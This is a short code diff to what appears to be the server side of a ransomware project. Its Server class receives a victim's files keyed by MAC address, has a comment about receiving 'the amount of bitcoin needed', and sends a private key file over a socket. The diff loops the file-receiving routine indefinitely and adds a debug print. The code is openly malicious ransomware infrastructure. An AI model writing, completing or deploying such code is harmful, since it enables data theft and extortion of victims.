@@ -164,7 +164,7 @@ class Server:
                     msg = base64.b64decode(connection.recv(Server.MAX_SIZE)).decode(Server.FORMAT)
                     print("[CLIENT]: "+msg)
 
-                    while not self._transfer_done:
+                    while True:
                         self.receive_victim_files(connection, victim_mac)
                         if self._transfer_done == True:
                             #Recieve the amount of bitcoin needed
@@ -193,6 +193,7 @@ class Server:
 
                         """ Sending the filename to the server. """
                         self._socket.sendall(base64.b64encode('private_key.pem'.encode(Server.FORMAT)))
+                        print("sent private key")
                         msg = base64.b64decode(self._socket.recv(Server.MAX_SIZE)).decode(Server.FORMAT)
                         print("[CLIENT]: "+msg)
 
